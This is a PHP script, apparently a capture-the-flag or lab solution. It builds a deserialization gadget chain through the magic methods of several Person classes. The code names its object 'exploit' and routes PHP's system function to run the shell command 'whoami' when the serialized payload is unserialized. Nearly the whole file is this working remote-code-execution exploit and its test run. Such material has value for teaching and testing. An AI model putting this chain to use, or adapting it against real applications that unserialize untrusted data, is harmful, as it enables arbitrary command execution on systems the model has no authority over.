<?php
// Define the classes
class Person {
    public $name;
    public $id;
    public $age;
}

class PersonA extends Person {
    public function __destruct() {
        $id = $this->id;
        ($this->name)->$id($this->age);
    }
}

class PersonB {
    private $name;
    private $id;
    private $age;

    public function __set($key, $value) {
        $this->name = $value;
    }

    public function __invoke($id) {
        $name = $this->id;
        $name->name = $id;
        $name->age = $this->name;
    }
}

class PersonC extends Person {
    public function check($age) {
        echo "PersonC::check called with age=$age\n";
        echo "Calling ($this->name)($age)...\n";
        ($this->name)($age);
    }

    public function __wakeup() {
        $name = $this->id;
        $name->age = $this->age;
        $name($this);
    }
}

// Create the payload
$inner = new PersonC();
$inner->name = "system";
$inner->id = new PersonB();
$inner->age = new stdClass();

$exploit = new PersonA();
$exploit->name = $inner;
$exploit->id = "check";
$exploit->age = "whoami";

$payload = serialize($exploit);
echo "Serialized payload:\n" . $payload . "\n\n";

// Test unserialize
echo "Testing unserialize and execution:\n";
echo "=================================\n";
$person = unserialize($payload);
echo "\n✓ Successfully unserialized without fatal errors!\n";
echo "Type: " . get_class($person) . "\n";
